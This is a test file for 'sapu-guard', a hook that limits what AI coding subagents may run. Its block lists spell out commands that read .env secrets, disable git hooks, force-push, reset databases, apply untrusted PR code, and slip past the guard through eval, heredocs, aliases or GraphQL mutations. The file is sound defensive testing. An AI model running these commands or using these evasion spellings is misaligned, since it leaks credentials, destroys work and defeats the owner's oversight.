// tests/sapu-guard.test.ts — the PreToolUse guard of the sapu:sapu-* agents
// (plugins/sapu/scripts/sapu-guard.mjs): every blocked incident, and the look-alikes that must pass.
// The repo rules come from a contract shaped like the first repo that ran sapu (fixture-contract.ts),
// so every case the guard enforced before it became generic is still enforced through the contract.
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, describe, expect, it } from "vitest";

import { check as checkUntyped, checkFile as checkFileUntyped, checkSearch as checkSearchUntyped, compileRules } from "../plugins/sapu/scripts/sapu-guard.mjs";
import { FIXTURE_CONTRACT } from "./fixture-contract";

const GUARD = join(__dirname, "../plugins/sapu/scripts/sapu-guard.mjs");
const check = checkUntyped as (i: { command: string; cwd: string; main?: string | null; rules?: unknown; worker?: boolean }) => string | null;
const checkFile = checkFileUntyped as (i: { tool: string; filePath: string; cwd: string; main?: string | null; rules?: unknown; worker?: boolean }) => string | null;
const checkSearch = checkSearchUntyped as (i: { tool: string; input: Record<string, string>; cwd: string; rules?: unknown }) => string | null;
const rules = compileRules(FIXTURE_CONTRACT);

const root = mkdtempSync(join(tmpdir(), "sapu-guard-"));
const main = join(root, "main");
const wt = join(main, ".claude/worktrees/wt-1");
mkdirSync(join(wt, "apps/api"), { recursive: true });
mkdirSync(join(wt, "apps/web"), { recursive: true });
writeFileSync(join(wt, ".git"), "gitdir: elsewhere\n"); // a worktree's .git is a file
mkdirSync(join(main, "node_modules"), { recursive: true });
afterAll(() => rmSync(root, { recursive: true, force: true }));

const blocked = (command: string, cwd = wt) => check({ command, cwd, main, rules });

describe("sapu-guard — blocks", () => {
  it.each([
    ["git stash"],
    ["git stash pop"],
    ["cd x && git stash drop"],
    ["git stash push -u"],
    ["pkill -f vitest"],
    ["killall node"],
    ["gh pr merge 12 --squash"],
    ["gh issue create --title x"],
    ["scripts/sapu-merge.sh 12 /tmp/r.md"],
    ["./scripts/weekly-gate.sh"],
    ["npm run check"],
    ["nice -n 15 env TEST_DB_WORKERS=8 npm run check 2>&1 | tail -40"],
    ["npm run check:full"],
    ["git push --no-verify"],
    ["git push --force origin x"],
    ["git push -f"],
    ["npx prisma migrate dev --name x"],
    ["npx prisma migrate reset --force"],
    ["npx prisma db push"],
    ['ln -s "$M/node_modules" node_modules'],
    ["env DATABASE_URL=postgresql://a:b@localhost:6543/app_test_x npx vitest run"],
    ["psql postgresql://a:b@localhost:5432/app_dev -c 'select 1'"],
    ['ln -s "$M/.env" .env'],
    ["set -a; source .env; set +a"],
    ["cp ../../.env.local ."],
    ["cat .env"],
    ["head -5 .env"],
    ["grep SECRET .env"],
    ["git stash drop"],
    ["bash -c \"gh pr merge 1\""],
    ["sh -c 'git stash'"],
    ["eval gh pr merge 1"],
    ["for n in 1 2; do gh pr merge $n; done"],
    ["echo $(git stash)"],
    ["xargs -I {} gh pr merge {}"],
    ["bash <<'EOF'\ngh pr merge 1\nEOF"],
    ["gh api -X PUT repos/o/r/pulls/1/merge"],
    ["gh api repos/o/r/pulls/1/merge -f merge_method=squash"],
    ["npm run check --fast"],
    ["npx tsx scripts/check.ts"],
    ["git push origin +feat/x"],
    ["git commit -n -m wip"],
    ["git worktree remove --force /x"],
    ["git branch -f main HEAD~3"],
    ["git branch -D feat/x"],
    ["echo sapu-guard-canary"],
    ["git -c core.hooksPath=/dev/null push origin HEAD:fix/x"],
    ["git config core.hooksPath /dev/null"],
    ["psql -p6543 -d x"],
    ["psql -h localhost --port 6543 -d x"],
    ["PGPORT=6543 PGDATABASE=app_dev psql -c 'delete from x'"],
    ["psql app_dev"],
    ['echo "$(gh pr merge 1)"'],
    ['x="`gh pr merge 1`"'],
    ["git stash -u"],
    ["git stash --keep-index"],
    ["git push origin :feature"],
    ["git push origin --delete feature"],
    ["cat <<EOF | bash\ngh pr merge 1\nEOF"],
    ['echo "<<EOF"; gh pr merge 1'],
    ["/usr/bin/env gh pr merge 1"],
    ["gh api -XPUT repos/o/r/pulls/1/merge"],
    ["gh api graphql -f query='mutation { mergePullRequest(input: {}) { clientMutationId } }'"],
    ["find . -name x -exec gh pr merge 1 \\;"],
  ])("%s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it("npm ci while a node_modules symlink exists below the worktree", () => {
    const link = join(wt, "apps/api/node_modules");
    symlinkSync(join(main, "node_modules"), link);
    try {
      expect(blocked("npm ci")).toMatch(/apps\/api\/node_modules/);
      expect(blocked(`cd ${wt} && npm install`, main)).not.toBeNull();
      // from a subfolder: npm installs at the workspace root, where the link lives
      expect(blocked("npm install", join(wt, "apps/web"))).toMatch(/apps\/api\/node_modules/);
      expect(blocked("pnpm install")).not.toBeNull();
      // workspace flags carry values: the verb is not the first word
      expect(blocked("npm -w apps/web install zod")).not.toBeNull();
      expect(blocked("npm --prefix apps/web install zod")).not.toBeNull();
      expect(blocked("npx npm ci")).not.toBeNull();
      expect(blocked("npm -w apps/web run build")).toBeNull();
    } finally {
      rmSync(link);
    }
  });

  it("a mutating git command in the main checkout, by cwd, cd, pushd, subshell or -C, quoted or not", () => {
    expect(blocked("git checkout -b x", main)).toMatch(/main checkout/);
    expect(blocked(`cd ${main} && git pull`)).not.toBeNull();
    expect(blocked(`git -C ${main} reset --hard origin/main`)).not.toBeNull();
    expect(blocked(`cd "${main}" && git pull`)).not.toBeNull();
    expect(blocked(`cd '${main}' && git reset --hard`)).not.toBeNull();
    expect(blocked(`git -C "${main}" pull`)).not.toBeNull();
    expect(blocked(`(cd ${main} && git pull)`)).not.toBeNull();
    expect(blocked(`pushd ${main} && git pull`)).not.toBeNull();
    expect(blocked('git -C "$M" reset --hard')).toMatch(/shell variable/);
    expect(blocked("gh pr checkout 3056", main)).toMatch(/gh pr checkout/);
    expect(blocked(`git --git-dir=${main}/.git --work-tree=${main} reset --hard`)).toMatch(/main checkout/);
    expect(blocked(`git --git-dir ${main}/.git reset --hard`)).toMatch(/main checkout/);
    expect(blocked(`GIT_DIR=${main}/.git git reset --hard`)).toMatch(/main checkout/);
    expect(blocked(`git --work-tree=${wt} status`)).toBeNull();
    // a cd inside a subshell, a pipeline or a background job does not move the parent
    expect(blocked("(cd /tmp); git pull", main)).toMatch(/main checkout/);
    expect(blocked("cd /tmp | true; git checkout main", main)).toMatch(/main checkout/);
    expect(blocked(`GIT_DIR=/x/.git GIT_WORK_TREE=${main} git reset --hard`)).toMatch(/main checkout/);
    expect(blocked(`git --git-dir= --work-tree=${main} checkout .`)).toMatch(/main checkout/);
  });
});

describe("sapu-guard — allows", () => {
  it.each([
    ["npm run check -- --fast 2>&1 | tail -40"],
    ["git stash push -m sapu-12"],
    ["git stash list"],
    ["git stash apply 1a2b3c"],
    ["git push --force-with-lease"],
    ["npx prisma migrate dev --create-only --name x"],
    ["scripts/sapu-merge.sh 12 /tmp/r.md --dry-run"],
    ['for e in a b; do ln -s "$M/node_modules/$e" "node_modules/$e"; done'],
    ['ln -s "$M/apps/api/node_modules" apps/api/node_modules'],
    ["set -a; source .env.test; set +a"],
    ["cat .env.example"],
    ["env DATABASE_URL=postgresql://a:b@localhost:5432/app_test_issue12 npx vitest run x"],
    ['git commit -m "never git stash, never gh pr merge, never npm run check"'],
    ['git commit -m "docs: never touch localhost:6543 or .env"'],
    ["git stash drop stash@{2}"],
    ["npx tsx scripts/check.ts --fast"],
    ["git push -u origin HEAD"],
    ["git commit --amend --no-edit"],
    ["gh api repos/o/r/pulls/1"],
    ["git reset --hard origin/feat/x"],
    ["node --import tsx scripts/red-area.ts 3056"],
    ["npm run check -- --fast"],
    ["npm -w apps/web run build"],
    ["grep -rn 6543 apps/api/src"],
    ["rg app_dev docs"],
    ["git stash push -m sapu-1 -u"],
    ["git push -u origin HEAD:feat/x"],
    ["npx vitest run x"],
    ["gh pr create --body-file /tmp/b.md <<'EOF'\nnpm run check\ngit stash\nEOF"],
    ['grep -rn ".env" apps/api/src'],
    ["npm ci"],
  ])("%s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  it("read-only git in the main checkout (reviewers start there)", () => {
    expect(blocked("git fetch origin main && git log --oneline -3 && git show HEAD --stat", main)).toBeNull();
    expect(blocked(`git -C ${wt} commit -m x`, main)).toBeNull();
  });
});

describe("sapu-guard — a subagent never runs a PR's code locally (public repositories)", () => {
  // A PR can be an outsider's. Only the orchestrator runs a PR, and only after `pr-trust` passed it;
  // a subagent reads it (`gh pr diff --name-only`, `pr-trust <N> --text`) and never brings its code
  // into a worktree, however the command is spelled.
  it.each([
    ["gh pr checkout 42"],
    ["gh pr checkout 42 --repo owner/app --force"],
    ["gh pr checkout https://github.com/owner/app/pull/42"],
    ["git fetch origin pull/42/head:pr-42"],
    ["git fetch origin refs/pull/42/head"],
    ["git fetch origin +refs/pull/*/head:refs/remotes/origin/pr/*"],
    ["git fetch -q origin 'pull/42/merge'"],
    ["git pull origin pull/42/head"],
    ["gh pr diff 42 --patch | git apply"],
    ["gh pr diff 42 | git apply -3"],
    ["gh pr diff 42 --patch | git am"],
    ["git am < pr.patch"],
    ["git apply pr.diff"],
    ["git apply --index pr.diff"],
    ["gh pr diff 42 | patch -p1"],
    ["gh -R owner/app pr diff 42 | patch -p1"],
    ["gh pr --repo=owner/app diff 42 | patch -p1"],
    ["gh pr --hostname github.com -Rowner/app diff 42 | patch -p1"],
    ["gh -R owner/app api repos/owner/app/pulls/42 -H 'Accept: application/vnd.github.diff' | patch -p1"],
    ["gh pr diff 42 > pr.diff && git apply pr.diff"],
    ["git apply <(gh pr diff 42)"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/runs a PR's code|PR's code/);
  });

  it.each([["gh pr diff 42 --name-only"], ["gh pr diff 42 | head -50"], ["gh -R owner/app pr diff 42 | head -50"], ["git apply --check pr.diff"], ["git apply --stat pr.diff"], ["patch -p1 < x.diff"], ["git fetch origin main"], ["git fetch -q origin feat/x"]])(
    "allows %s",
    (cmd) => {
      expect(blocked(cmd)).toBeNull();
    },
  );

  // Other ways to bring code that is not origin's branches into a worktree.
  it.each([
    ["git fetch origin 0123456789abcdef0123456789abcdef01234567"],
    ["git fetch origin deadbeef1"],
    ['git fetch origin "+refs/*:refs/remotes/all/*"'],
    ["git fetch origin 'refs/p*:refs/x/*'"],
    ["git fetch https://github.com/stranger/app.git feat"],
    ["git fetch git@github.com:stranger/app.git feat"],
    ["git pull https://github.com/stranger/app.git feat"],
    ["git fetch upstream"],
    ["git fetch --depth 1 upstream main"],
    ["git clone https://github.com/stranger/app.git ../fork"],
    ["gh repo clone stranger/app ../fork"],
    ['gh api "repos/owner/app/contents/package.json?ref=refs/pull/42/head" --jq .content'],
    ["gh api repos/owner/app/tarball/refs/pull/42/head"],
    ['gh pr diff 42 | sh -c "patch -p1"'],
    ["gh pr diff 42 | busybox patch -p1"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/PR's code|not origin's/);
  });

  it.each([
    ["git fetch"],
    ["git fetch --all"],
    ["git fetch --depth 1 origin main"],
    ["git fetch origin 'refs/heads/*:refs/remotes/origin/*'"],
    ["git fetch origin +refs/tags/*:refs/tags/*"],
    ["git fetch origin cafe"],
    ["git pull origin feat/x"],
    ["git merge-file a b c"],
  ])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

describe("sapu-guard — gh is read the way gh reads it: global flags, aliases, unknown commands", () => {
  it.each([
    ["gh -R owner/app pr checkout 42", /PR's code/],
    ["gh -Rowner/app pr checkout 42", /PR's code/],
    ["gh --hostname github.com pr checkout 42", /PR's code/],
    ["gh --repo owner/app pr merge 42 --squash", /only the orchestrator merges/],
    ["gh --repo=owner/app pr merge 42", /only the orchestrator merges/],
    ["gh --hostname=github.com pr merge 42", /only the orchestrator merges/],
    ["gh -R x issue create --title t", /files no issues/],
    ["gh -R x api -X PUT repos/o/r/pulls/42/merge", /only the orchestrator merges/],
    ["gh co 42", /PR's code/],
    ["gh my-alias 42", /not one of gh's own commands/],
    ["gh copilotx suggest", /not one of gh's own commands/],
  ])("blocks %s", (cmd, why) => {
    expect(blocked(cmd)).toMatch(why);
  });

  it.each([["gh pr view 3 --json number"], ["gh -R owner/app pr diff 3 --name-only"], ["gh --version"], ["gh auth status"], ["gh issue list --json number"], ["gh api repos/o/r/pulls/1"], ["gh pr -R x view 42"], ["gh pr view -R x 42 --json number"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  // gh accepts its repo/host flags anywhere before the subcommand (`gh pr -R cli/cli view 1`).
  it.each([
    ["gh pr -R owner/app merge 42", /only the orchestrator merges/, true],
    ["gh pr --repo owner/app merge 42 --admin", /only the orchestrator merges/, true],
    ["gh pr --repo=owner/app checkout 42", /PR's code/, true],
    ["gh pr --hostname github.com -R x checkout 42", /PR's code/, true],
    ["gh issue -R x create --title t", /files no issues/, false],
    ["gh issue -R x edit 45 --add-label sapu:accepted", /acceptance label/, true],
    ["gh label -R x create sapu:accepted", /acceptance label/, true],
    ["gh pr -R x edit 42 --add-label sapu:accepted", /acceptance label/, true],
    ["gh alias -R x set co2 'pr checkout'", /alias/, true],
  ])("blocks %s — a flag between the group and the subcommand", (cmd, why, reviewerToo) => {
    expect(blocked(cmd)).toMatch(why);
    if (reviewerToo) expect(check({ command: cmd, cwd: wt, main, rules, worker: false })).toMatch(why);
  });
});

describe("sapu-guard — no subagent applies, removes or redefines the acceptance label", () => {
  // Every agent works under the owner's token, so GitHub would accept its label change as the
  // owner's: acceptance of an outsider's issue must stay the owner's own act.
  const custom = compileRules({ ...FIXTURE_CONTRACT, labels: { ...FIXTURE_CONTRACT.labels, accepted: "triage:ok" } });
  it.each([
    ["gh issue edit 8 --add-label sapu:accepted"],
    ['gh issue edit 8 --add-label "bug,Sapu:Accepted"'],
    ["gh issue edit 8 --remove-label=sapu:accepted"],
    ["gh -R owner/app issue edit 8 --add-label sapu:accepted"],
    ["gh pr edit 8 --add-label sapu:accepted"],
    ['gh api -X POST repos/o/r/issues/8/labels -f "labels[]=sapu:accepted"'],
    ["gh api repos/o/r/issues/8/labels -f labels[]=sapu:accepted"],
    ["gh api -X DELETE repos/o/r/issues/8/labels/sapu%3Aaccepted"],
    ["gh api -X PATCH repos/o/r/labels/bug -f new_name=sapu:accepted"],
    ["gh api -X POST repos/o/r/labels -f name=sapu:accepted"],
    ["gh api -X POST repos/o/r/issues/8/labels --input labels.json"],
    ["gh api graphql -f query='mutation { addLabelsToLabelable(input: {labelableId: \"I_1\", labelIds: [\"LA_1\"]}) { clientMutationId } }'"],
    ["gh api graphql -f query='mutation { removeLabelsFromLabelable(input: {labelableId: \"I_1\", labelIds: [\"LA_1\"]}) { clientMutationId } }'"],
    ["gh api graphql -f query='mutation { updateLabel(input: {id: \"LA_1\", name: \"x\"}) { clientMutationId } }'"],
    ["gh api graphql -f query='mutation { createLabel(input: {repositoryId: \"R\", name: \"x\", color: \"fff\"}) { clientMutationId } }'"],
    ["gh label create sapu:accepted"],
    ["gh label edit bug --name sapu:accepted"],
    ["gh label edit sapu:accepted --color ffffff"],
    ["gh label delete sapu:accepted --yes"],
    ["gh label clone other/repo"],
  ])("blocks %s — for workers and reviewers alike", (cmd) => {
    expect(blocked(cmd)).toMatch(/acceptance label/);
    expect(check({ command: cmd, cwd: wt, main, rules, worker: false })).toMatch(/acceptance label/);
  });

  it("the label is the contract's labels.accepted", () => {
    expect(check({ command: "gh issue edit 8 --add-label triage:ok", cwd: wt, main, rules: custom })).toMatch(/acceptance label/);
    expect(check({ command: "gh issue edit 8 --add-label sapu:accepted", cwd: wt, main, rules: custom })).toBeNull();
  });

  it.each([["gh issue edit 8 --add-label bug"], ['gh issue edit 8 --add-label agent:in-progress --remove-label "agent:queued"'], ["gh label create bug"], ["gh api repos/o/r/issues/8/labels"], ["gh label list"]])(
    "allows %s",
    (cmd) => {
      expect(blocked(cmd)).toBeNull();
    },
  );
});

describe("sapu-guard CLI", () => {
  const run = (input: object) => {
    try {
      execFileSync("node", [GUARD], { input: JSON.stringify(input), stdio: ["pipe", "pipe", "pipe"] });
      return 0;
    } catch (e) {
      return (e as { status: number }).status;
    }
  };

  // A real repo, so the CLI can resolve <MAIN> and read its committed contract.
  const repo = join(root, "repo");
  mkdirSync(join(repo, ".claude"), { recursive: true });
  execFileSync("git", ["init", "-q", repo]);
  const bare = join(root, "bare");
  execFileSync("git", ["init", "-q", bare]);
  const agent = "sapu:sapu-sonnet-high";
  // agent_type null = the orchestrator (the main session: its hook input has no agent_type)
  const bash = (command: string, agent_type: string | null = agent, cwd = repo) =>
    run({ tool_name: "Bash", ...(agent_type ? { agent_type } : {}), tool_input: { command }, cwd });
  const file = (tool_name: string, file_path: string, agent_type = agent) =>
    run({ tool_name, agent_type, tool_input: tool_name === "NotebookEdit" ? { notebook_path: file_path } : { file_path }, cwd: repo });

  it("exits 2 on a blocked Bash call of a sapu agent, 0 otherwise", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    expect(bash("gh pr merge 1")).toBe(2);
    expect(bash("npm run check")).toBe(2);
    expect(bash("ls")).toBe(0);
  });

  it("polices every subagent, nested ones included; never the orchestrator (no agent_type)", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    expect(bash("gh pr merge 1", null)).toBe(0);
    for (const t of ["senior-qa-analyst", "general-purpose", "other:sapu-sonnet-high-x"]) {
      expect(bash("gh pr merge 1", t)).toBe(2);
      expect(bash("ls", t)).toBe(0);
    }
  });

  it("blocks everything but the canary when the contract is missing (sapu agents) or invalid (every subagent)", () => {
    expect(bash("ls", agent, bare)).toBe(2);
    expect(bash("echo sapu-guard-canary", agent, bare)).toBe(2);
    // a repo that has not run /sapu:init yet: other subagents keep the engine floor only
    expect(bash("ls", "general-purpose", bare)).toBe(0);
    expect(bash("gh pr merge 1", "general-purpose", bare)).toBe(2);
    commitContract(repo, { ...FIXTURE_CONTRACT, guard: { deny: [] } });
    expect(bash("ls")).toBe(2);
    expect(bash("ls", "general-purpose")).toBe(2);
    commitContract(repo, FIXTURE_CONTRACT);
  });

  it("reads <MAIN>'s COMMITTED contract: a working-tree edit neither relaxes nor breaks it (1a)", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    const relaxed = { ...FIXTURE_CONTRACT, gate: { ...FIXTURE_CONTRACT.gate, merge: "make x", fast: "make x FAST=1" }, guard: { envFiles: [], postgres: null, deny: [] } };
    writeFileSync(join(repo, ".claude/sapu.json"), JSON.stringify(relaxed));
    expect(bash("npm run check")).toBe(2);
    expect(bash("psql -p 6543")).toBe(2);
    writeFileSync(join(repo, ".claude/sapu.json"), "{ not json");
    expect(bash("ls")).toBe(0);
    commitContract(repo, FIXTURE_CONTRACT);
  });

  it("Read/Write/Edit/MultiEdit/NotebookEdit of an env file are blocked (1c)", () => {
    commitContract(repo, { ...FIXTURE_CONTRACT, guard: { ...FIXTURE_CONTRACT.guard, envFiles: [".env.production"] } });
    const w = join(repo, ".claude/worktrees/wt-a");
    for (const tool of ["Read", "Write", "Edit", "MultiEdit"]) expect(file(tool, join(w, ".env"))).toBe(2);
    expect(file("NotebookEdit", join(w, "apps/.env.local"))).toBe(2);
    expect(file("Read", join(w, "config/.env.production"))).toBe(2);
    expect(file("Read", join(w, ".env.example"))).toBe(0);
    expect(file("Read", join(w, "src/env.ts"))).toBe(0);
    commitContract(repo, FIXTURE_CONTRACT);
  });

  it("Grep/Glob that name or could match an env file are blocked through the hook (round 3, 1)", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    const w = join(repo, ".claude/worktrees/wt-a");
    mkdirSync(w, { recursive: true });
    const tool = (tool_name: string, tool_input: Record<string, string>) => run({ tool_name, agent_type: agent, tool_input, cwd: w });
    expect(tool("Grep", { pattern: "KEY", path: join(w, ".env") })).toBe(2);
    expect(tool("Grep", { pattern: "KEY", glob: ".env*" })).toBe(2);
    expect(tool("Glob", { pattern: "**/.env" })).toBe(2);
    expect(tool("Grep", { pattern: "KEY", glob: "*.ts" })).toBe(0);
    expect(tool("Glob", { pattern: "**/*.ts" })).toBe(0);
  });

  it("a write into the main checkout is blocked, a write into one of its worktrees is not (1c)", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    const w = join(repo, ".claude/worktrees/wt-a");
    mkdirSync(join(w, "src"), { recursive: true });
    mkdirSync(join(repo, "node_modules/pkg"), { recursive: true });
    try {
      symlinkSync(join(repo, "node_modules"), join(w, "node_modules"));
    } catch {}
    for (const tool of ["Write", "Edit", "MultiEdit"]) expect(file(tool, join(repo, "src/new/x.ts"))).toBe(2);
    expect(file("Edit", join(repo, ".claude/sapu.json"))).toBe(2);
    expect(file("Write", join(repo, ".claude/worktrees/../sapu.json"))).toBe(2);
    expect(file("NotebookEdit", join(repo, "nb.ipynb"))).toBe(2);
    // through a node_modules symlink in the worktree: the real target is <MAIN>
    expect(file("Write", join(w, "node_modules/pkg/index.js"))).toBe(2);
    expect(file("Write", join(w, "src/x.ts"))).toBe(0);
    expect(file("Edit", join(w, "src/deeper/y.ts"))).toBe(0);
    expect(file("Read", join(repo, "src/new/x.ts"))).toBe(0);
    // the orchestrator still writes where it wants
    expect(run({ tool_name: "Write", tool_input: { file_path: join(repo, "src/x.ts") }, cwd: repo })).toBe(0);
  });

  it("round 4 C: other subagents may file issues and write into <MAIN>; the rest of the floor still holds", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    for (const t of ["senior-qa-analyst", "general-purpose", "sapu-wave:argus"]) {
      expect(bash("gh issue create --title x --body y", t)).toBe(0);
      expect(bash(`mkdir -p ${repo}/.argus && echo x >> ${repo}/.argus/run.log`, t)).toBe(0);
      expect(file("Write", join(repo, ".claude/agent-memory/a/b.md"), t)).toBe(0);
      for (const c of ["git push origin HEAD:main", "gh pr merge 1", "git stash", "git commit --no-verify -m x", "cat .env", "psql -p 6543", "npm run check"]) expect(bash(c, t), `${t}: ${c}`).toBe(2);
    }
    // a sapu worker keeps the whole floor
    expect(bash("gh issue create --title x --body y")).toBe(2);
    expect(bash(`echo x >> ${repo}/.argus/run.log`)).toBe(2);
    expect(file("Write", join(repo, ".claude/agent-memory/a/b.md"))).toBe(2);
    // ~20 guard processes plus a git commit: past 5 s on a loaded machine, so it gets its own budget.
  }, 30_000);

  it("the plugin's built-in specialist role agents (sapu:sapu-<role>) are reviewers, not ladder workers", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    for (const role of ["qa", "architect", "db", "developer", "ux", "writer", "product"]) {
      const t = `sapu:sapu-${role}`;
      expect(bash("gh issue create --title x --body y", t), t).toBe(0);
      expect(bash("gh pr merge 1", t), t).toBe(2);
    }
  });

  it("round 5: a non-worker writes into <MAIN> only under the plugin's state dirs", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    const dev = "senior-fullstack-developer";
    for (const [tool, p] of [["Edit", "apps/x.ts"], ["Write", ".claude/sapu.json"], ["MultiEdit", "src/y.ts"], ["NotebookEdit", "nb.ipynb"]]) expect(file(tool, join(repo, p), dev), `${tool} ${p}`).toBe(2);
    expect(bash(`sed -i '' 's/a/b/' ${repo}/apps/x.ts`, dev)).toBe(2);
    expect(bash(`cat > ${repo}/apps/x.ts <<'EOF'\nx\nEOF`, dev)).toBe(2);
    for (const p of [".argus/cycle.json", ".claude/agent-memory/a/b.md", "dreams/DREAM-x.md", ".momus/r.md"]) expect(file("Write", join(repo, p), dev), p).toBe(0);
    expect(bash(`mkdir -p ${repo}/.nemesis && echo x > ${repo}/.nemesis/f.json`, dev)).toBe(0);
    expect(bash("gh issue create --title x --body y", dev)).toBe(0);
    // a worker stays out of <MAIN> entirely
    for (const p of [".argus/cycle.json", ".claude/agent-memory/a/b.md", "dreams/DREAM-x.md"]) expect(file("Write", join(repo, p)), p).toBe(2);
    expect(bash(`echo x > ${repo}/.nemesis/f.json`)).toBe(2);
  });

  it("recognises itself when started through a symlink (11)", () => {
    commitContract(repo, FIXTURE_CONTRACT);
    const link = join(root, "guard-link.mjs");
    try {
      symlinkSync(GUARD, link);
    } catch {}
    let status = 0;
    try {
      execFileSync("node", [link], { input: JSON.stringify({ tool_name: "Bash", agent_type: agent, tool_input: { command: "gh pr merge 1" }, cwd: repo }), stdio: ["pipe", "pipe", "pipe"] });
    } catch (e) {
      status = (e as { status: number }).status;
    }
    expect(status).toBe(2);
  });
});

/** Commit `contract` as <repo>/.claude/sapu.json (the guard reads HEAD, not the working tree). */
function commitContract(repo: string, contract: unknown) {
  writeFileSync(join(repo, ".claude/sapu.json"), JSON.stringify(contract));
  const git = (...a: string[]) => execFileSync("git", ["-C", repo, "-c", "user.email=t@example.com", "-c", "user.name=t", ...a], { stdio: "ignore" });
  git("add", ".claude/sapu.json");
  git("commit", "-q", "--allow-empty", "-m", "contract");
}

describe("sapu-guard — contract rules", () => {
  it("denies the merge gate automatically, allowing the fast gate that extends it", () => {
    const r = compileRules({ ...FIXTURE_CONTRACT, gate: { ...FIXTURE_CONTRACT.gate, merge: "make gate", fast: "make gate FAST=1" }, guard: { envFiles: [], postgres: null, deny: [] } });
    expect(check({ command: "make gate", cwd: wt, main, rules: r })).toMatch(/merge gate/);
    expect(check({ command: "make gate FAST=1", cwd: wt, main, rules: r })).toBeNull();
    expect(check({ command: "bash scripts/sapu-hooks.sh after", cwd: wt, main, rules })).toMatch(/merge gate/);
  });

  it("adds env files and databases, never removes the floor", () => {
    const r = compileRules({ ...FIXTURE_CONTRACT, guard: { envFiles: [".env.production"], postgres: { ports: [6000], databases: ["prod_copy"] }, deny: [] } });
    expect(check({ command: "cat .env.production", cwd: wt, main, rules: r })).toMatch(/env files/);
    expect(check({ command: "cat .env", cwd: wt, main, rules: r })).toMatch(/env files/);
    expect(check({ command: "psql -p 6000", cwd: wt, main, rules: r })).toMatch(/protected database/);
    expect(check({ command: "pg_dump prod_copy", cwd: wt, main, rules: r })).toMatch(/protected database/);
    expect(check({ command: "psql -p 6543 -d x", cwd: wt, main, rules: r })).toBeNull();
  });

  it("engine rules hold with no contract at all", () => {
    expect(check({ command: "git stash", cwd: wt, main })).not.toBeNull();
    expect(check({ command: "cat .env.local", cwd: wt, main })).not.toBeNull();
    expect(check({ command: "npm run check", cwd: wt, main })).toBeNull();
  });
});

// ---- second-round review fixes: each block names the finding it closes ----------------------------
const withRules = (over: Record<string, unknown>) => compileRules({ ...FIXTURE_CONTRACT, ...over } as typeof FIXTURE_CONTRACT);
const guardOnly = (guard: Partial<typeof FIXTURE_CONTRACT.guard>) => withRules({ guard: { envFiles: [], postgres: null, deny: [], ...guard } });

describe("review fixes — env files in option values and globs (3)", () => {
  it.each([
    ["node --env-file=.env scripts/x.js"],
    ["node --env-file .env scripts/x.js"],
    ["DOTENV_CONFIG_PATH=.env node x.js"],
    ["dotenv -e=.env.local -- node x.js"],
    ["X=.env"],
    ["cat .env*"],
    ["cat .e?v"],
    ["cat [.]env"],
    ["cp .env.l* /tmp/x"],
    ["cat .{env,md}"],
    ["cat {README.md,.env.local}"],
    ["find . -name '.env*' -exec cat {} +"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/env files/);
  });

  it.each([["ls *"], ["cat *.md"], ["rm -f *.log"], ["ls .github/*"], ["cat .env.example"], ["cat .e*.example"], ["node --import=tsx x.ts"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  it("a glob is checked against the contract's env files too", () => {
    const r = guardOnly({ envFiles: ["secrets.env"] });
    expect(check({ command: "cat *.env", cwd: wt, main, rules: r })).toMatch(/env files/);
    expect(check({ command: "cat *.md", cwd: wt, main, rules: r })).toBeNull();
  });
});

describe("review fixes — npm verb aliases and yarn/pnpm scripts without `run` (4)", () => {
  it.each([
    ["npm run-script check"],
    ["npm rum check"],
    ["npm urn check"],
    ["pnpm run-script check"],
    ["yarn check"],
    ["pnpm check"],
    ["pnpm run check:full"],
    ["yarn run check:full"],
    ["yarn check:full"],
    ["pnpm check:full"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it.each([["npm run-script check -- --fast"], ["yarn check -- --fast"], ["pnpm run check -- --fast"], ["yarn build"], ["npm run checkpoint"], ["npm rum build"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

describe("review fixes — the deny matcher and the auto-denied merge gate (5)", () => {
  it.each([
    ["git add scripts/check.ts"],
    ["cat scripts/check.ts"],
    ["git diff -- scripts/check.ts"],
    ["sed -n 1,20p scripts/check.ts"],
    ["cp scripts/sapu-hooks.sh /tmp/x"],
    ["git log -p scripts/sapu-hooks.sh"],
  ])("a denied path that is only read or named is allowed: %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  it.each([
    ["cd scripts && npx tsx check.ts"],
    ["cd scripts && ./sapu-hooks.sh gate"],
    ["cd scripts && bash sapu-hooks.sh gate"],
    ["node scripts/check.ts"],
    ["bun scripts/check.ts"],
    ["source scripts/sapu-hooks.sh"],
    ["sh ./scripts/sapu-hooks.sh gate"],
    ["bash -e scripts/sapu-hooks.sh gate"],
    [`bash ${wt}/scripts/sapu-hooks.sh gate`],
    ['cd "$X" && ./scripts/sapu-hooks.sh gate'],
    ["npm run -w apps/x check"],
    ["npm run --workspace=x check"],
  ])("an executed denied path, or argv words in order, is blocked: %s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it("rule words are peeled like commands (a rule written with npx matches with and without it)", () => {
    const r = guardOnly({ deny: [{ argv: ["npx", "playwright", "test"], reason: "e2e is orchestrator-only." }] });
    expect(check({ command: "npx playwright test", cwd: wt, main, rules: r })).toMatch(/e2e/);
    expect(check({ command: "playwright test x.spec.ts", cwd: wt, main, rules: r })).toMatch(/e2e/);
